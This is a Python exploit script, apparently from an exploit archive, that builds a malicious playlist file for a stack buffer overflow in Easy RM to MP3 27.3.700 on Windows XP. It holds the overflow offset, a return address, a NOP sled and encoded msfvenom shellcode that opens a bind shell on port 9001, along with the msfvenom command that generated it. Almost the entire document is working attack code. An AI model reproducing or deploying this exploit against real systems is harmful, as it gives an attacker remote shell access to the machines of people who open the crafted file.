# Exploit for Easy RM to MP3 27.3.700 - Stack Buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.pls", "wb")

# badchars = "\x00\x09\x0a"

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x09\x0a" -f c

shellcode = ("\xdb\xc3\xbb\xd7\x25\x1f\x47\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x53\x31\x5f\x17\x03\x5f\x17\x83\x10\x21\xfd\xb2\x62\xc2\x83"
"\x3d\x9a\x13\xe4\xb4\x7f\x22\x24\xa2\xf4\x15\x94\xa0\x58\x9a"
"\x5f\xe4\x48\x29\x2d\x21\x7f\x9a\x98\x17\x4e\x1b\xb0\x64\xd1"
"\x9f\xcb\xb8\x31\xa1\x03\xcd\x30\xe6\x7e\x3c\x60\xbf\xf5\x93"
"\x94\xb4\x40\x28\x1f\x86\x45\x28\xfc\x5f\x67\x19\x53\xeb\x3e"
"\xb9\x52\x38\x4b\xf0\x4c\x5d\x76\x4a\xe7\x95\x0c\x4d\x21\xe4"
"\xed\xe2\x0c\xc8\x1f\xfa\x49\xef\xff\x89\xa3\x13\x7d\x8a\x70"
"\x69\x59\x1f\x62\xc9\x2a\x87\x4e\xeb\xff\x5e\x05\xe7\xb4\x15"
"\x41\xe4\x4b\xf9\xfa\x10\xc7\xfc\x2c\x91\x93\xda\xe8\xf9\x40"
"\x42\xa9\xa7\x27\x7b\xa9\x07\x97\xd9\xa2\xaa\xcc\x53\xe9\xa2"
"\x21\x5e\x11\x33\x2e\xe9\x62\x01\xf1\x41\xec\x29\x7a\x4c\xeb"
"\x4e\x51\x28\x63\xb1\x5a\x49\xaa\x76\x0e\x19\xc4\x5f\x2f\xf2"
"\x14\x5f\xfa\x6f\x1c\xc6\x55\x92\xe1\xb8\x05\x12\x49\x51\x4c"
"\x9d\xb6\x41\x6f\x77\xdf\xea\x92\x78\xfc\xc3\x1b\x9e\x68\x04"
"\x4a\x08\x04\xe6\xa9\x81\xb3\x19\x98\xb9\x53\x51\xca\x7e\x5c"
"\x62\xd8\x28\xca\xe9\x0f\xed\xeb\xed\x05\x45\x7c\x79\xd3\x04"
"\xcf\x1b\xe4\x0c\xa7\xb8\x77\xcb\x37\xb6\x6b\x44\x60\x9f\x5a"
"\x9d\xe4\x0d\xc4\x37\x1a\xcc\x90\x70\x9e\x0b\x61\x7e\x1f\xd9"
"\xdd\xa4\x0f\x27\xdd\xe0\x7b\xf7\x88\xbe\xd5\xb1\x62\x71\x8f"
"\x6b\xd8\xdb\x47\xed\x12\xdc\x11\xf2\x7e\xaa\xfd\x43\xd7\xeb"
"\x02\x6b\xbf\xfb\x7b\x91\x5f\x03\x56\x11\x7f\xe6\x72\x6c\xe8"
"\xbf\x17\xcd\x75\x40\xc2\x12\x80\xc3\xe6\xea\x77\xdb\x83\xef"
"\x3c\x5b\x78\x82\x2d\x0e\x7e\x31\x4d\x1b")

buffer = "A" * 26064 + "\x3A\xf2\xc1\x01" + 26 * "\x90" + shellcode

file.write(buffer)
file.close()
